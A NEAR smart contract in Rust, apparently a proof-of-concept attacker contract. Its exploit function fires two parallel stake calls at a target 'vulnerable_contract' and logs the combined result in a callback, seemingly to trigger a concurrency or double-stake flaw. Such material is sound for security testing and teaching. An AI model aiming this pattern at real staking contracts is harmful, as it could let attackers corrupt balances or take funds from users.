use near_sdk::borsh::{self, BorshDeserialize, BorshSerialize};

use near_sdk::ext_contract;
use near_sdk::{env, json_types::U128, near_bindgen, AccountId, Gas, Promise, PromiseError};

pub const TGAS: u64 = 1_000_000_000_000;

#[ext_contract(vulnerable_contract)]
trait Victim {
    fn stake(&mut self, validator: AccountId, amount: U128);
}

#[near_bindgen]
#[derive(BorshDeserialize, BorshSerialize)]
pub struct Contract {}

impl Default for Contract {
    fn default() -> Self {
        Self {}
    }
}

#[near_bindgen]
impl Contract {
    pub fn exploit(addr: AccountId, amount: U128) -> Promise {
        vulnerable_contract::ext(addr.clone())
            .with_static_gas(Gas(30 * TGAS))
            .stake("test.near".parse().unwrap(), amount)
            .and(
                vulnerable_contract::ext(addr)
                    .with_static_gas(Gas(30 * TGAS))
                    .stake("test.near".parse().unwrap(), amount)
                    .then(
                        Self::ext(env::current_account_id())
                            .with_static_gas(Gas(5 * TGAS))
                            .resolve_exploit(),
                    ),
            )
    }

    #[private]
    pub fn resolve_exploit(&mut self, #[callback_result] result: Result<(), PromiseError>) -> bool {
        if result.is_err() {
            env::log_str(&format!("Callback failed: {:?}", result.unwrap_err()));
            return false;
        } else {
            env::log_str("Callback succeeded");
            return true;
        }
    }
}
